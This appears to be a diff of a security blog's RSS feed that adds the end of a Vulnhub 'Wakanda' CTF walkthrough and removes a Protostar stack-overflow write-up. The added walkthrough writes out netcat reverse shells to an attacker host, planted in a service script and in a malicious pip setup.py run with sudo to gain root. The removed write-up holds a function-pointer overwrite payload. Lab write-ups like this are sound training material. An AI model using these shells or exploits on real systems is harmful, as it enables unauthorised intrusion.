+niamey@10.0.0.13: Permission denied (publickey,password).&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;But it did not work out, so I decided to check &lt;code class=&quot;highlighter-rouge&quot;&gt;mamadou&lt;/code&gt; as it’s the possible creator.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ssh mamadou@10.0.0.13 -p 3333
+mamadou@10.0.0.13's password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Aug  3 15:53:29 2018 from 192.168.56.1
+Python 2.7.9 (default, Jun 29 2016, 13:08:31) 
+[GCC 4.9.2] on linux2
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+
+
+&amp;gt;&amp;gt;&amp;gt; import pty
+&amp;gt;&amp;gt;&amp;gt; pty.spawn(&quot;/bin/bash&quot;)
+mamadou@Wakanda1:~$ whoami
+mamadou
+mamadou@Wakanda1:~$ id
+uid=1000(mamadou) gid=1000(mamadou) groups=1000(mamadou)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;At the login we are greeted with the python interpreter, but we can easily spawn the &lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt; shell with &lt;code class=&quot;highlighter-rouge&quot;&gt;pty&lt;/code&gt;. Now it’s time for more enumeration.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;mamadou@Wakanda1:~$ ls -la
+total 24
+drwxr-xr-x 2 mamadou mamadou 4096 Aug  5 02:24 .
+drwxr-xr-x 4 root    root    4096 Aug  1 15:23 ..
+lrwxrwxrwx 1 root    root       9 Aug  5 02:24 .bash_history -&amp;gt; /dev/null
+-rw-r--r-- 1 mamadou mamadou  220 Aug  1 13:15 .bash_logout
+-rw-r--r-- 1 mamadou mamadou 3515 Aug  1 13:15 .bashrc
+-rw-r--r-- 1 mamadou mamadou   41 Aug  1 15:52 flag1.txt
+-rw-r--r-- 1 mamadou mamadou  675 Aug  1 13:15 .profile
+mamadou@Wakanda1:~$ cat flag1.txt 
+
+Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And the first flag! Two more to go.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;mamadou@Wakanda1:~$ ls -la /home
+total 16
+drwxr-xr-x  4 root    root      4096 Aug  1 15:23 .
+drwxr-xr-x 22 root    root      4096 Aug  1 13:05 ..
+drwxr-xr-x  2 devops  developer 4096 Aug  5 02:25 devops
+drwxr-xr-x  2 mamadou mamadou   4096 Aug  5 02:24 mamadou&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory we can see another user &lt;code class=&quot;highlighter-rouge&quot;&gt;devops&lt;/code&gt;, with a second flag inside his directory. While looking for some more clues, I found &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; file in &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;mamadou@Wakanda1:/$ cd tmp
+mamadou@Wakanda1:/tmp$ ls -la
+total 32
+drwxrwxrwt  7 root   root      4096 Aug  8 10:00 .
+drwxr-xr-x 22 root   root      4096 Aug  1 13:05 ..
+drwxrwxrwt  2 root   root      4096 Aug  8 05:19 .font-unix
+drwxrwxrwt  2 root   root      4096 Aug  8 05:19 .ICE-unix
+-rw-r--r--  1 devops developer    4 Aug  8 09:59 test
+drwxrwxrwt  2 root   root      4096 Aug  8 05:19 .Test-unix
+drwxrwxrwt  2 root   root      4096 Aug  8 05:19 .X11-unix
+drwxrwxrwt  2 root   root      4096 Aug  8 05:19 .XIM-unix
+mamadou@Wakanda1:/tmp$ cat test
+test&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It’s owner is &lt;code class=&quot;highlighter-rouge&quot;&gt;devops&lt;/code&gt;, so I decided to find more files that he’s an owner of.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;mamadou@Wakanda1:/tmp$ find / -user devops 2&amp;gt;/dev/null
+/srv/.antivirus.py
+/tmp/test
+/home/devops
+/home/devops/.bashrc
+/home/devops/.profile
+/home/devops/.bash_logout
+/home/devops/flag2.txt
+
+mamadou@Wakanda1:/tmp$ cat /srv/.antivirus.py 
+open('/tmp/test','w').write('test')&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Hey, it’s a python script in &lt;code class=&quot;highlighter-rouge&quot;&gt;/srv/&lt;/code&gt; directory. I decided to change it with &lt;code class=&quot;highlighter-rouge&quot;&gt;os.system('nc -e /bin/sh 10.0.0.4 1337')&lt;/code&gt; that will spawn a reverse shell whenever the script is executed, but I could not find any cronjobs that could execute it. To my amusement, after coming back after a small break, I’ve noticed a shell in my listener.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nc -lvp 1337
+listening on [any] 1337 ...
+10.0.0.13: inverse host lookup failed: Unknown host
+connect to [10.0.0.4] from (UNKNOWN) [10.0.0.13] 36433
+whoami
+devops
+python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);'
+devops@Wakanda1:/$ 
+
+
+devops@Wakanda1:/$ cd home/devops
+cd home/devops
+devops@Wakanda1:~$ ls -la
+ls -la
+total 24
+drwxr-xr-x 2 devops developer 4096 Aug  5 02:25 .
+drwxr-xr-x 4 root   root      4096 Aug  1 15:23 ..
+lrwxrwxrwx 1 root   root         9 Aug  5 02:25 .bash_history -&amp;gt; /dev/null
+-rw-r--r-- 1 devops developer  220 Aug  1 15:23 .bash_logout
+-rw-r--r-- 1 devops developer 3515 Aug  1 15:23 .bashrc
+-rw-r----- 1 devops developer   42 Aug  1 15:57 flag2.txt
+-rw-r--r-- 1 devops developer  675 Aug  1 15:23 .profile
+devops@Wakanda1:~$ cat flag2.txt
+cat flag2.txt
+Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we have a second flag, but what executed this file? I decided to look for the files containing &lt;code class=&quot;highlighter-rouge&quot;&gt;antivirus.py&lt;/code&gt; in it.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;mamadou@Wakanda1:/etc$ grep -Ril .antivirus.py / 2&amp;gt;/dev/null
+/lib/systemd/system/antivirus.service
+^C
+mamadou@Wakanda1:/etc$ cat /lib/systemd/system/antivirus.service 
+[Unit]
+Description=Antivirus
+After=network.target
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=300 
+User=devops
+ExecStart=/usr/bin/env python /srv/.antivirus.py
+
+[Install]
+WantedBy=multi-user.target&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Oh, so there it is! Restarted every 300 seconds, a service that will run the antivirus. As this is completed, let’s move to escalation to root.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;devops@Wakanda1:~$ sudo -l
+sudo -l
+Matching Defaults entries for devops on Wakanda1:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User devops may run the following commands on Wakanda1:
+    (ALL) NOPASSWD: /usr/bin/pip&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can run as &lt;code class=&quot;highlighter-rouge&quot;&gt;pip&lt;/code&gt; as root, which makes our search much easier. While googling, I’ve found &lt;a href=&quot;https://github.com/0x00-0x00/FakePip&quot;&gt;this technique&lt;/a&gt; to execute command with pip.&lt;/p&gt;
+
+&lt;p&gt;Let’s download &lt;code class=&quot;highlighter-rouge&quot;&gt;setup.py&lt;/code&gt; as instructed and change the base64 encoded string into simple &lt;code class=&quot;highlighter-rouge&quot;&gt;os.system('nc -e /bin/sh 10.0.0.4 443')&lt;/code&gt;. Here is our modified script in &lt;code class=&quot;highlighter-rouge&quot;&gt;fakepip&lt;/code&gt; directory.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;devops@Wakanda1:~/fakepip$ wget 10.0.0.4:8080/setup.py
+wget 10.0.0.4:8080/setup.py
+--2018-08-08 13:54:39--  http://10.0.0.4:8080/setup.py
+Connecting to 10.0.0.4:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 545 [text/plain]
+Saving to: ‘setup.py’
+
+setup.py            100%[=====================&amp;gt;]     545  --.-KB/s   in 0s     
+
+2018-08-08 13:54:39 (4.85 MB/s) - ‘setup.py’ saved [545/545]
+
+devops@Wakanda1:~/fakepip$ cat setup.py
+cat setup.py
+from setuptools import setup
+from setuptools.command.install import install
+import os
+
+class CustomInstall(install):
+    def run(self):
+        install.run(self)
+        os.system('nc -e /bin/sh 10.0.0.4 443')
+
+setup(name='FakePip',
+      version='0.0.1',
+      description='This will exploit a sudoer able to /usr/bin/pip install *',
+      url='https://github.com/0x00-0x00/fakepip',
+      author='zc00l',
+      author_email='andre.marques@esecurity.com.br',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install':CustomInstall})&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we’re ready to install the package.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;devops@Wakanda1:~/fakepip$ sudo /usr/bin/pip install . --upgrade --force-reinstall
+&amp;lt;sudo /usr/bin/pip install . --upgrade --force-reinstall                     
+Unpacking /home/devops/fakepip
+  Running setup.py (path:/tmp/pip-4FK12P-build/setup.py) egg_info for package from file:///home/devops/fakepip
+    
+Installing collected packages: FakePip
+  Found existing installation: FakePip 0.0.1
+    Uninstalling FakePip:
+      Successfully uninstalled FakePip
+  Running setup.py install for FakePip&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And what’s in our listener?&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nc -lvp 443
+listening on [any] 443 ...
+10.0.0.13: inverse host lookup failed: Unknown host
+connect to [10.0.0.4] from (UNKNOWN) [10.0.0.13] 51199
+whoami
+root
+python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);'
+root@Wakanda1:/tmp/pip-4FK12P-build# cd /root
+cd /root
+root@Wakanda1:~# ls -la
+ls -la
+total 20
+drwx------  2 root root 4096 Aug  5 02:26 .
+drwxr-xr-x 22 root root 4096 Aug  1 13:05 ..
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r--  1 root root  140 Nov 19  2007 .profile
+-rw-r-----  1 root root  429 Aug  1 15:16 root.txt
+root@Wakanda1:~# cat root.txt
+cat root.txt
+ _    _.--.____.--._
+( )=.-&quot;:;:;:;;':;:;:;&quot;-._
+ \\\:;:;:;:;:;;:;::;:;:;:\
+  \\\:;:;:;:;:;;:;:;:;:;:;\
+   \\\:;::;:;:;:;:;::;:;:;:\
+    \\\:;:;:;:;:;;:;::;:;:;:\
+     \\\:;::;:;:;:;:;::;:;:;:\
+      \\\;;:;:_:--:_:_:--:_;:;\
+       \\\_.-&quot;             &quot;-._\
+        \\
+         \\
+          \\
+           \\ Wakanda 1 - by @xMagass
+            \\
+             \\
+
+
+Congratulations You are Root!
+
+821ae63dbe0c573eff8b69d451fb21bc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And we have a flag!&lt;/p&gt;
+</description>
+        <pubDate>Thu, 09 Aug 2018 02:00:00 +0200</pubDate>
+        <link>http://localhost:4000/vulnhub-wakanda/</link>
+        <guid isPermaLink="true">http://localhost:4000/vulnhub-wakanda/</guid>
+      </item>
+    
+      <item>
         <title>Vulnhub.com - Lampião</title>
         <description>&lt;p&gt;Let’s start another quick machine from Vulnhub called &lt;strong&gt;Lampião&lt;/strong&gt;.&lt;/p&gt;
 
@@ -2846,93 +3438,6 @@ FuN_w1th_5h3ll_v4riabl3s_haha&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
         <pubDate>Mon, 28 May 2018 02:00:00 +0200</pubDate>
         <link>http://localhost:4000/pwnable.kr-cmd2/</link>
         <guid isPermaLink="true">http://localhost:4000/pwnable.kr-cmd2/</guid>
-      </item>
-    
-      <item>
-        <title>Protostar - Stack 03</title>
-        <description>&lt;p&gt;Let’s start by looking at the source code of the challenge.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
-#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;code flow successfully changed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)();&lt;/span&gt;
-  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;calling function pointer, jumping to 0x%08x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;As you can see we have additional &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; function that we have to call. In the main we have function pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;fp&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;buffer&lt;/code&gt;. As the pointer in the code is assigned &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, no function is called. But what will happen if we would assign &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt; to fp? Then in &lt;code class=&quot;highlighter-rouge&quot;&gt;fp();&lt;/code&gt;, the function would be called.&lt;/p&gt;
-
-&lt;p&gt;In order to complete that, we have to find the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; function. We can do this in both &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;objdump&lt;/code&gt;, but in this task objdump will be faster.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; stack3
-
-stack3:     file format elf32-i386
-
-08048424 &amp;lt;win&amp;gt;:
- 8048424:	55                   	push   %ebp
- 8048425:	89 e5                	mov    %esp,%ebp
- 8048427:	83 ec 18             	sub    &lt;span class=&quot;nv&quot;&gt;$0x18&lt;/span&gt;,%esp
- 804842a:	c7 04 24 40 85 04 08 	movl   &lt;span class=&quot;nv&quot;&gt;$0x8048540&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- 8048431:	e8 2a ff ff ff       	call   8048360 &amp;lt;puts@plt&amp;gt;
- 8048436:	c9                   	leave  
- 8048437:	c3                   	ret    
-
-08048438 &amp;lt;main&amp;gt;:
- 8048438:	55                   	push   %ebp
- 8048439:	89 e5                	mov    %esp,%ebp
- 804843b:	83 e4 f0             	and    &lt;span class=&quot;nv&quot;&gt;$0xfffffff0&lt;/span&gt;,%esp
- 804843e:	83 ec 60             	sub    &lt;span class=&quot;nv&quot;&gt;$0x60&lt;/span&gt;,%esp
- 8048441:	c7 44 24 5c 00 00 00 	movl   &lt;span class=&quot;nv&quot;&gt;$0x0&lt;/span&gt;,0x5c&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- 8048448:	00
- 8048449:	8d 44 24 1c          	lea    0x1c&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
- 804844d:	89 04 24             	mov    %eax,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- 8048450:	e8 db fe ff ff       	call   8048330 &amp;lt;gets@plt&amp;gt;
- 8048455:	83 7c 24 5c 00       	cmpl   &lt;span class=&quot;nv&quot;&gt;$0x0&lt;/span&gt;,0x5c&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- 804845a:	74 1b                	je     8048477 &amp;lt;main+0x3f&amp;gt;
- 804845c:	b8 60 85 04 08       	mov    &lt;span class=&quot;nv&quot;&gt;$0x8048560&lt;/span&gt;,%eax
- 8048461:	8b 54 24 5c          	mov    0x5c&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%edx
- 8048465:	89 54 24 04          	mov    %edx,0x4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- 8048469:	89 04 24             	mov    %eax,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- 804846c:	e8 &lt;span class=&quot;nb&quot;&gt;df &lt;/span&gt;fe ff ff       	call   8048350 &amp;lt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt&amp;gt;
- 8048471:	8b 44 24 5c          	mov    0x5c&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
- 8048475:	ff d0                	call   &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;%eax
- 8048477:	c9                   	leave  
- 8048478:	c3                   	ret    
- 8048479:	90                   	nop
- 804847a:	90                   	nop
- 804847b:	90                   	nop
- 804847c:	90                   	nop
- 804847d:	90                   	nop
- 804847e:	90                   	nop
- 804847f:	90                   	nop&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Some of the output is omitted for clearability, here we have the most important information - &lt;code class=&quot;highlighter-rouge&quot;&gt;08048424 &amp;lt;win&amp;gt;&lt;/code&gt; - that’s our address &lt;code class=&quot;highlighter-rouge&quot;&gt;08048424&lt;/code&gt;. Now we have to pass this to the binary, together with 64 bytes that will fill the buffer.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print(&quot;A&quot; * 64 + &quot;\x24\x84\x04\x08&quot;)'&lt;/span&gt; | ./stack3
- calling &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;pointer, jumping to 0x08048424
- code flow successfully changed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-</description>
-        <pubDate>Sat, 12 May 2018 02:00:00 +0200</pubDate>
-        <link>http://localhost:4000/protostar-3/</link>
-        <guid isPermaLink="true">http://localhost:4000/protostar-3/</guid>
       </item>
     
   </channel>
